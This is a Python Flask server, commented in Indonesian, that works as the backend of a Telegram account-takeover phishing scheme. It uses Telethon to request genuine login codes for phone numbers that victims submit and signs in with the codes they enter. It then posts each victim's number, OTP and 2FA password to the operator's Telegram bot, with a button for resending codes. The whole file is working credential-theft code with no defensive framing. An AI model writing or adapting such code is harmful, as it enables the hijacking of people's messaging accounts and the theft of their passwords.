import os
from flask import Flask, request, jsonify, make_response
from flask_cors import CORS
import requests
from telethon import TelegramClient, errors
from asgiref.sync import async_to_sync

app = Flask(__name__)
CORS(app)

# Variabel Dashboard Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

sessions_hash = {}

def send_to_bot_with_button(text, nomor):
    """Kirim pesan ke bot dengan tombol Inline untuk kirim ulang OTP"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "Markdown",
        "reply_markup": {
            "inline_keyboard": [[
                {"text": "🔄 Kirim Ulang OTP", "callback_data": f"resend_{nomor}"}
            ]]
        }
    }
    requests.post(url, json=payload)

def fix_number(nomor_input):
    """Otomatis ubah 08xxx menjadi +628xxx"""
    nomor_input = nomor_input.strip()
    if nomor_input.startswith('0'):
        return '+62' + nomor_input[1:]
    elif nomor_input.startswith('62'):
        return '+' + nomor_input
    return nomor_input

async def telethon_logic(data):
    step = data.get('step')
    nomor = fix_number(data.get('nomor', ''))
    otp = data.get('otp')
    sandi = data.get('sandi')

    client = TelegramClient(f"session_{nomor}", int(API_ID), API_HASH)
    
    try:
        await client.connect()
        
        if step == 1 or step == "resend":
            try:
                sent_code = await client.send_code_request(nomor)
                sessions_hash[nomor] = sent_code.phone_code_hash
                msg = f"✅ *OTP Berhasil Dikirim*\nNomor: `{nomor}`\n\n_Gunakan tombol di bawah jika kode tidak masuk._"
                send_to_bot_with_button(msg, nomor)
                return {"status": "success"}, 200
            except Exception as e:
                error_msg = f"❌ *Gagal Kirim OTP*\nNomor: `{nomor}`\nError: {str(e)}"
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                             json={"chat_id": CHAT_ID, "text": error_msg})
                return {"status": "error", "message": str(e)}, 400

        elif step == 2:
            phone_code_hash = sessions_hash.get(nomor)
            try:
                await client.sign_in(nomor, otp, phone_code_hash=phone_code_hash)
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                             json={"chat_id": CHAT_ID, "text": f"✅ *Login Sukses*\nNomor: `{nomor}`\nOTP: `{otp}`"})
                return {"status": "success"}, 200
            except errors.SessionPasswordNeededError:
                return {"status": "need_2fa"}, 200
            except Exception as e:
                return {"status": "error", "message": str(e)}, 400

        elif step == 3:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                         json={"chat_id": CHAT_ID, "text": f"🔑 *Sandi 2FA*\nNomor: `{nomor}`\nSandi: `{sandi}`"})
            return {"status": "success"}, 200

    finally:
        await client.disconnect()

@app.route('/register', methods=['POST', 'OPTIONS'])
def register():
    if request.method == 'OPTIONS':
        return make_response(jsonify({"status": "ok"}), 200)
    data = request.json
    try:
        result, status_code = async_to_sync(telethon_logic)(data)
        return make_response(jsonify(result), status_code)
    except Exception as e:
        return make_response(jsonify({"status": "error", "message": str(e)}), 500)

# Endpoint untuk menangani klik tombol dari Telegram
@app.route('/bot-callback', methods=['POST'])
def bot_callback():
    update = request.json
    if "callback_query" in update:
        data = update["callback_query"]["data"]
        if data.startswith("resend_"):
            nomor = data.replace("resend_", "")
            # Jalankan kirim ulang OTP secara asinkron
            async_to_sync(telethon_logic)({"step": "resend", "nomor": nomor})
    return jsonify({"status": "ok"}), 200

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8080))
    app.run(host="0.0.0.0", port=port)